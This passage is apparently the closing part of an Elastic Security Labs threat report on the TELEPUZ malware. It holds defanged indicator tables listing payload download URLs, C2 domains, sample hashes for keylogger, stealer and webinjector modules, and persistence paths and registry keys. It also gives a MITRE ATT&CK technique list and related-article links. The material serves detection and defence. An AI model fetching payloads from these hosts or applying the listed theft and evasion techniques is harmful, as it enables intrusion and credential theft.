+   "text": "Domain | First Seen | URL ¶ chubrik\\[.\\]sbs | 2026-05-09 | hxxps://chubrik\\[.\\]sbs/files/xK7mR9pL2nQw5tY8/ygvfuyze.dll ¶ betalegenda\\[.\\]cfd | 2026-05-14 | hxxps://betalegenda\\[.\\]cfd/files/xK7mR9pL2nQw5tY8/kmwvogwx.dll ¶ mavpaprokla\\[.\\]lat | 2026-05-19 | hxxps://mavpaprokla\\[.\\]lat/files/telemetriawork/telepuz.dll ¶ comicstar\\[.\\]lat | 2026-05-26 | hxxps://comicstar\\[.\\]lat/files/telemetriawork/telepuz.dll ¶ bigblower\\[.\\]click | 2026-05-28 | hxxps://bigblower\\[.\\]click/files/telemetriawork/telepuz.dll ¶ momasites\\[.\\]lol | 2026-06-05 | hxxps://momasites\\[.\\]lol/files/telemetriawork/telepuz.dll ¶ momasites\\[.\\]com | 2026-06-07 | hxxps://momasites\\[.\\]com/files/telemetrywork/telepuz ¶ mamsites\\[.\\]lol | 2026-06-07 | hxxps://mamsites\\[.\\]lol/files/telemetrywork/telepuz.dll ¶ hardenedom\\[.\\]shop | 2026-06-07 | hxxps://hardenedom\\[.\\]shop/files/telemetriawork/telepuz.dll ¶ hardendedom\\[.\\]shop | 2026-06-07 | hxxps://hardendedom\\[.\\]shop/files/lemetriawork/epuz.dll ¶ hardendom\\[.\\]shop | 2026-06-08 | hxxps://hardendom\\[.\\]shop/files/telemetry/telepuz.dll ¶ hardeneddom\\[.\\]shop | 2026-06-10 | hxxps://hardeneddom\\[.\\]shop/files/telemetrywork/telepuz ¶ netblokirovka\\[.\\]asia | 2026-06-11 | hxxps://netblokirovka\\[.\\]asia/files/telemetriawork/telepuz.dll ¶ netblokir\\[.\\]asia | 2026-06-12 | hxxps://netblokir\\[.\\]asia/files/telemetriawork/telepuz.dll ¶ netlobikrovka\\[.\\]asia | 2026-06-14 | hxxps://netlobikrovka\\[.\\]asia/files/telemetriawork/telepuz.dll ¶ neblokirovka\\[.\\]as | 2026-06-15 | hxxps://neblokirovka\\[.\\]as/telemetry/network/telepuz.dll ¶ kidsko\\[.\\]shop | 2026-06-17 | hxxps://kidsko\\[.\\]shop/files/telemetriawork/telepuz.dll ¶ mazaporka\\[.\\]shop | 2026-06-22 | hxxps://mazaporka\\[.\\]shop/files/telemetriawork/telepuz.dll ¶ 172.67.215[.]214 | 2026-06-24 | hxxps://172.67.215[.]214/files/telemetriawork/telepuz.dll ¶ hurgadatour\\[.\\]shop | 2026-06-25 | hxxps://hurgadatour\\[.\\]shop/files/telemetriawork/telepuz.dll ¶ krabsburger\\[.\\]xyz | 2026-06-29 | hxxp://krabsburger\\[.\\]xyz/files/telemetriawork/telepuz.dll ¶ zewaplus\\[.\\]club | 2026-06-30 | hxxps://zewaplus\\[.\\]club/files/telemetriawork/telepuz.dll ¶ 172.67.165[.]144 | 2026-07-06 | hxxps://172.67.165[.]144/files/telemetriawork/telepuz.dll",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "chubrik\\[.\\]sbs",
+      "2026-05-09",
+      "hxxps://chubrik\\[.\\]sbs/files/xK7mR9pL2nQw5tY8/ygvfuyze.dll"
+     ],
+     [
+      "betalegenda\\[.\\]cfd",
+      "2026-05-14",
+      "hxxps://betalegenda\\[.\\]cfd/files/xK7mR9pL2nQw5tY8/kmwvogwx.dll"
+     ],
+     [
+      "mavpaprokla\\[.\\]lat",
+      "2026-05-19",
+      "hxxps://mavpaprokla\\[.\\]lat/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "comicstar\\[.\\]lat",
+      "2026-05-26",
+      "hxxps://comicstar\\[.\\]lat/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "bigblower\\[.\\]click",
+      "2026-05-28",
+      "hxxps://bigblower\\[.\\]click/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "momasites\\[.\\]lol",
+      "2026-06-05",
+      "hxxps://momasites\\[.\\]lol/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "momasites\\[.\\]com",
+      "2026-06-07",
+      "hxxps://momasites\\[.\\]com/files/telemetrywork/telepuz"
+     ],
+     [
+      "mamsites\\[.\\]lol",
+      "2026-06-07",
+      "hxxps://mamsites\\[.\\]lol/files/telemetrywork/telepuz.dll"
+     ],
+     [
+      "hardenedom\\[.\\]shop",
+      "2026-06-07",
+      "hxxps://hardenedom\\[.\\]shop/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "hardendedom\\[.\\]shop",
+      "2026-06-07",
+      "hxxps://hardendedom\\[.\\]shop/files/lemetriawork/epuz.dll"
+     ],
+     [
+      "hardendom\\[.\\]shop",
+      "2026-06-08",
+      "hxxps://hardendom\\[.\\]shop/files/telemetry/telepuz.dll"
+     ],
+     [
+      "hardeneddom\\[.\\]shop",
+      "2026-06-10",
+      "hxxps://hardeneddom\\[.\\]shop/files/telemetrywork/telepuz"
+     ],
+     [
+      "netblokirovka\\[.\\]asia",
+      "2026-06-11",
+      "hxxps://netblokirovka\\[.\\]asia/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "netblokir\\[.\\]asia",
+      "2026-06-12",
+      "hxxps://netblokir\\[.\\]asia/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "netlobikrovka\\[.\\]asia",
+      "2026-06-14",
+      "hxxps://netlobikrovka\\[.\\]asia/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "neblokirovka\\[.\\]as",
+      "2026-06-15",
+      "hxxps://neblokirovka\\[.\\]as/telemetry/network/telepuz.dll"
+     ],
+     [
+      "kidsko\\[.\\]shop",
+      "2026-06-17",
+      "hxxps://kidsko\\[.\\]shop/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "mazaporka\\[.\\]shop",
+      "2026-06-22",
+      "hxxps://mazaporka\\[.\\]shop/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "172.67.215[.]214",
+      "2026-06-24",
+      "hxxps://172.67.215[.]214/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "hurgadatour\\[.\\]shop",
+      "2026-06-25",
+      "hxxps://hurgadatour\\[.\\]shop/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "krabsburger\\[.\\]xyz",
+      "2026-06-29",
+      "hxxp://krabsburger\\[.\\]xyz/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "zewaplus\\[.\\]club",
+      "2026-06-30",
+      "hxxps://zewaplus\\[.\\]club/files/telemetriawork/telepuz.dll"
+     ],
+     [
+      "172.67.165[.]144",
+      "2026-07-06",
+      "hxxps://172.67.165[.]144/files/telemetriawork/telepuz.dll"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Domain",
+     "First Seen",
+     "URL"
+    ]
+   },
+   "layout": "table",
+   "section": "TELEPUZ indicators of compromise"
+  },
+  {
+   "id": "b218",
+   "page": null,
+   "text": "The table below lists the identified C2 infrastructure domains:",
+   "type": "paragraph",
+   "section": "TELEPUZ indicators of compromise"
+  },
+  {
+   "id": "b219",
+   "page": null,
+   "text": "Domain | Notes ¶ cal.joycedoula[.]com[.]br | Present in configuration of earliest samples. ¶ cal.snehamumbai[.]org | Latest C2",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "cal.joycedoula[.]com[.]br",
+      "Present in configuration of earliest samples."
+     ],
+     [
+      "cal.snehamumbai[.]org",
+      "Latest C2"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Domain",
+     "Notes"
+    ]
+   },
+   "layout": "table",
+   "section": "TELEPUZ indicators of compromise"
+  },
+  {
+   "id": "b220",
+   "page": null,
+   "text": "The table below list analyzed samples and their artifacts:",
+   "type": "paragraph",
+   "section": "TELEPUZ indicators of compromise"
+  },
+  {
+   "id": "b221",
+   "page": null,
+   "text": "Artifact | Type ¶ 58aec6e3835aaf20f7b4a7e308b36a19e7454673a6f71783871e9bcf6cae8eed | Reference TELEPUZ main payload ¶ bf3b4e645a3c0c23f87c55971069014f7424ad14497371ee7567eff68ffaf343 | TELEPUZ main payload ¶ ff791fe1532a2dc3b3c188a71bfd0177f973ef228e4d1dda1db6d3c4b0d62b3e | TELEPUZ main payload ¶ a955d7e2819d5fa8b5f879cb970e1a1a91327098a7383f2a03a5e1e7e19435e3 | TELEPUZ keylogger module ¶ 9733a3f6409de81271f21993c7f8b9865ac9f5c68c3d4336e91afe6b312477eb | TELEPUZ stealer module ¶ 444f1c0c82b3f6cc31d685bac68b20edbde5722ce219af9cceab0c2a6537efc1 | TELEPUZ webinjector module ¶ cfgmgr\\_mtx | mutex ¶ bginfod\\_mtx | mutex ¶ wfj64\\_mtx | mutex ¶ %AppData%\\\\Local\\\\DCFG\\\\Runtime\\\\Themes\\\\Processor\\\\etwhost.dll | persistence ¶ %AppData%\\\\Roaming\\\\StateRepository\\\\Host\\\\Recovery\\\\systemreset.dll | persistence ¶ %AppData%\\\\Local\\\\MiravaDevices\\\\noraxrecovery.dll | persistence ¶ %ProgramData%\\\\XeroxPrint\\\\Temp\\\\Worker\\\\grpeng.dll | install ¶ %ProgramData%\\\\Jundrax\\\\Tracker\\\\IrenScanner.dll | install ¶ %ProgramData%\\\\QualcommRF\\\\dsp\\_agent.dll | install ¶ HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\CipherAllocator | registry ¶ HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\PilotmasterMast | registry",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "58aec6e3835aaf20f7b4a7e308b36a19e7454673a6f71783871e9bcf6cae8eed",
+      "Reference TELEPUZ main payload"
+     ],
+     [
+      "bf3b4e645a3c0c23f87c55971069014f7424ad14497371ee7567eff68ffaf343",
+      "TELEPUZ main payload"
+     ],
+     [
+      "ff791fe1532a2dc3b3c188a71bfd0177f973ef228e4d1dda1db6d3c4b0d62b3e",
+      "TELEPUZ main payload"
+     ],
+     [
+      "a955d7e2819d5fa8b5f879cb970e1a1a91327098a7383f2a03a5e1e7e19435e3",
+      "TELEPUZ keylogger module"
+     ],
+     [
+      "9733a3f6409de81271f21993c7f8b9865ac9f5c68c3d4336e91afe6b312477eb",
+      "TELEPUZ stealer module"
+     ],
+     [
+      "444f1c0c82b3f6cc31d685bac68b20edbde5722ce219af9cceab0c2a6537efc1",
+      "TELEPUZ webinjector module"
+     ],
+     [
+      "cfgmgr\\_mtx",
+      "mutex"
+     ],
+     [
+      "bginfod\\_mtx",
+      "mutex"
+     ],
+     [
+      "wfj64\\_mtx",
+      "mutex"
+     ],
+     [
+      "%AppData%\\\\Local\\\\DCFG\\\\Runtime\\\\Themes\\\\Processor\\\\etwhost.dll",
+      "persistence"
+     ],
+     [
+      "%AppData%\\\\Roaming\\\\StateRepository\\\\Host\\\\Recovery\\\\systemreset.dll",
+      "persistence"
+     ],
+     [
+      "%AppData%\\\\Local\\\\MiravaDevices\\\\noraxrecovery.dll",
+      "persistence"
+     ],
+     [
+      "%ProgramData%\\\\XeroxPrint\\\\Temp\\\\Worker\\\\grpeng.dll",
+      "install"
+     ],
+     [
+      "%ProgramData%\\\\Jundrax\\\\Tracker\\\\IrenScanner.dll",
+      "install"
+     ],
+     [
+      "%ProgramData%\\\\QualcommRF\\\\dsp\\_agent.dll",
+      "install"
+     ],
+     [
+      "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\CipherAllocator",
+      "registry"
+     ],
+     [
+      "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\PilotmasterMast",
+      "registry"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": [
+     "Artifact",
+     "Type"
+    ]
+   },
+   "layout": "table",
+   "section": "TELEPUZ indicators of compromise"
+  },
+  {
+   "id": "b222",
+   "page": null,
+   "text": "TELEPUZ MITRE ATT&CK tactics and techniques",
+   "type": "heading",
+   "level": 2,
+   "section": "TELEPUZ MITRE ATT&CK tactics and techniques"
+  },
+  {
+   "id": "b223",
+   "page": null,
+   "text": "Elastic uses the MITRE ATT&CK framework to document common tactics, techniques, and procedures that threats use against enterprise networks.",
+   "type": "paragraph",
+   "section": "TELEPUZ MITRE ATT&CK tactics and techniques"
+  },
+  {
+   "id": "b224",
+   "page": null,
+   "text": "Tactics",
+   "type": "heading",
+   "level": 3,
+   "section": "Tactics"
+  },
+  {
+   "id": "b225",
+   "page": null,
+   "text": "Tactics represent the why of a technique or sub-technique. It is the adversary's tactical goal: the reason for performing an action.",
+   "type": "paragraph",
+   "section": "Tactics"
+  },
+  {
+   "id": "b226",
+   "page": null,
+   "text": "Resource Development",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b227",
+   "page": null,
+   "text": "Initial Access",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b228",
+   "page": null,
+   "text": "Execution",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b229",
+   "page": null,
+   "text": "Persistence",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b230",
+   "page": null,
+   "text": "Privilege Escalation",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b231",
+   "page": null,
+   "text": "Defense Evasion",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b232",
+   "page": null,
+   "text": "Credential Access",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b233",
+   "page": null,
+   "text": "Discovery",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b234",
+   "page": null,
+   "text": "Collection",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b235",
+   "page": null,
+   "text": "Command and Control",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b236",
+   "page": null,
+   "text": "Exfiltration",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b237",
+   "page": null,
+   "text": "Techniques",
+   "type": "heading",
+   "level": 3,
+   "section": "Techniques"
+  },
+  {
+   "id": "b238",
+   "page": null,
+   "text": "Techniques represent how an adversary achieves a tactical goal by performing an action.",
+   "type": "paragraph",
+   "section": "Techniques"
+  },
+  {
+   "id": "b239",
+   "page": null,
+   "text": "Command and Scripting Interpreter: PowerShell",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b240",
+   "page": null,
+   "text": "Native API",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b241",
+   "page": null,
+   "text": "Shared Modules",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b242",
+   "page": null,
+   "text": "System Services: Service Execution",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b243",
+   "page": null,
+   "text": "Signed Binary Proxy Execution: Rundll32",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b244",
+   "page": null,
+   "text": "Create or Modify System Process: Windows Service",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b245",
+   "page": null,
+   "text": "Modify Registry",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b246",
+   "page": null,
+   "text": "Abuse Elevation Control Mechanism: Bypass User Account Control",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b247",
+   "page": null,
+   "text": "Access Token Manipulation: Token Impersonation/Theft",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b248",
+   "page": null,
+   "text": "Access Token Manipulation: Create Process with Token",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b249",
+   "page": null,
+   "text": "Process Injection: Process Hollowing",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b250",
+   "page": null,
+   "text": "Reflective Code Loading",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b251",
+   "page": null,
+   "text": "Impair Defenses: Indicator Blocking",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b252",
+   "page": null,
+   "text": "Obfuscated Files or Information: Dynamic API Resolution",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b253",
+   "page": null,
+   "text": "Obfuscated Files or Information: Encrypted/Encoded File",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b254",
+   "page": null,
+   "text": "Masquerading: Match Legitimate Name or Location",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b255",
+   "page": null,
+   "text": "Debugger Evasion",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b256",
+   "page": null,
+   "text": "Virtualization/Sandbox Evasion: System Checks",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b257",
+   "page": null,
+   "text": "Virtualization/Sandbox Evasion: Time Based Evasion",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b258",
+   "page": null,
+   "text": "Steal Web Session Cookie",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b259",
+   "page": null,
+   "text": "Credentials from Password Stores",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b260",
+   "page": null,
+   "text": "Input Capture: Keylogging",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b261",
+   "page": null,
+   "text": "Process Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b262",
+   "page": null,
+   "text": "File and Directory Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b263",
+   "page": null,
+   "text": "System Information Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b264",
+   "page": null,
+   "text": "System Owner/User Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b265",
+   "page": null,
+   "text": "Software Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b266",
+   "page": null,
+   "text": "System Location Discovery: System Language Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b267",
+   "page": null,
+   "text": "Screen Capture",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b268",
+   "page": null,
+   "text": "Archive Collected Data: Archive via Library",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b269",
+   "page": null,
+   "text": "Man in the Browser",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b270",
+   "page": null,
+   "text": "Application Layer Protocol: Web Protocols",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b271",
+   "page": null,
+   "text": "Encrypted Channel: Asymmetric Cryptography",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b272",
+   "page": null,
+   "text": "Ingress Tool Transfer",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b273",
+   "page": null,
+   "text": "Web Service: Dead Drop Resolver",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b274",
+   "page": null,
+   "text": "Exfiltration Over C2 Channel",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b275",
+   "page": null,
+   "text": "Indicator Removal: File Deletion",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b276",
+   "page": null,
+   "text": "TELEPUZ YARA detection rule",
+   "type": "heading",
+   "level": 2,
+   "section": "TELEPUZ YARA detection rule"
+  },
+  {
+   "id": "b277",
+   "page": null,
+   "text": "Windows_Trojan_Telepuz.yar",
+   "type": "paragraph",
+   "section": "TELEPUZ YARA detection rule"
+  },
+  {
+   "id": "b278",
+   "page": null,
+   "text": "Report an issue",
+   "type": "paragraph",
+   "section": "TELEPUZ YARA detection rule"
+  },
+  {
+   "id": "b279",
+   "page": null,
+   "text": "Related Content",
+   "type": "heading",
+   "level": 3,
+   "section": "Related Content"
+  },
+  {
+   "id": "b280",
+   "page": null,
+   "text": "Auditing the auditor: Unmasking Apex Accelerator",
+   "type": "paragraph",
+   "section": "Related Content"
+  },
+  {
+   "id": "b281",
+   "page": null,
+   "text": "Malware AnalysisThreat IntelligenceAI Security",
+   "type": "paragraph",
+   "section": "Related Content"
+  },
+  {
+   "id": "b282",
+   "page": null,
+   "text": "Auditing the auditor: Unmasking Apex Accelerator",
+   "type": "heading",
+   "level": 3,
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b283",
+   "page": null,
+   "text": "October 12, 2026",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b284",
+   "page": null,
+   "text": "Jia Yu Chan",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b285",
+   "page": null,
+   "text": "+1",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b286",
+   "page": null,
+   "text": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b287",
+   "page": null,
+   "text": "Malware AnalysisThreat Intelligence",
+   "type": "paragraph",
+   "section": "Auditing the auditor: Unmasking Apex Accelerator"
+  },
+  {
+   "id": "b288",
+   "page": null,
+   "text": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions",
+   "type": "heading",
+   "level": 3,
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b289",
+   "page": null,
+   "text": "September 14, 2026",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b290",
+   "page": null,
+   "text": "Cyril François",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b291",
+   "page": null,
+   "text": "+1",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b292",
+   "page": null,
+   "text": "REVSTEALER ramps up: analysis of up-and-coming infostealer",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b293",
+   "page": null,
+   "text": "Detection EngineeringMalware AnalysisThreat Intelligence",
+   "type": "paragraph",
+   "section": "The extension you never installed: KREMLIN forges Chrome's own integrity checks to steal banking sessions"
+  },
+  {
+   "id": "b294",
+   "page": null,
+   "text": "REVSTEALER ramps up: analysis of up-and-coming infostealer",
+   "type": "heading",
+   "level": 3,
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b295",
+   "page": null,
+   "text": "September 02, 2026",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b296",
+   "page": null,
+   "text": "Daniel Stepanic",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b297",
+   "page": null,
+   "text": "+2",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b298",
+   "page": null,
+   "text": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b299",
+   "page": null,
+   "text": "Malware Analysis",
+   "type": "paragraph",
+   "section": "REVSTEALER ramps up: analysis of up-and-coming infostealer"
+  },
+  {
+   "id": "b300",
+   "page": null,
+   "text": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit",
+   "type": "heading",
+   "level": 3,
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b301",
+   "page": null,
+   "text": "July 08, 2026",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b302",
+   "page": null,
+   "text": "Jia Yu Chan",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b303",
+   "page": null,
+   "text": "+1",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b304",
+   "page": null,
+   "text": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b305",
+   "page": null,
+   "text": "Malware Analysis",
+   "type": "paragraph",
+   "section": "ClickFix to Cash-Out: Anatomy of a Mexican Banking-Fraud Toolkit"
+  },
+  {
+   "id": "b306",
+   "page": null,
+   "text": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER",
+   "type": "heading",
+   "level": 3,
+   "section": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER"
+  },
+  {
+   "id": "b307",
+   "page": null,
+   "text": "June 19, 2026",
+   "type": "paragraph",
+   "section": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER"
+  },
+  {
+   "id": "b308",
+   "page": null,
+   "text": "Daniel Stepanic",
+   "type": "paragraph",
+   "section": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER"
+  },
+  {
+   "id": "b309",
+   "page": null,
+   "text": "+1",
+   "type": "paragraph",
+   "section": "Lost in relocation: analysis of a new loader distributing CASTLESTEALER"
+  },
+  {
+   "id": "b310",
+   "page": null,
+   "text": "Elastic Security Labs Newsletter",
+   "type": "heading",
+   "level": 3,
+   "section": "Elastic Security Labs Newsletter"
+  },
+  {
+   "id": "b311",
+   "page": null,
+   "text": "Follow Elastic Security Labs on",
+   "type": "paragraph",
+   "section": "Elastic Security Labs Newsletter"
+  }
+ ],
+ "language": "en"
+}
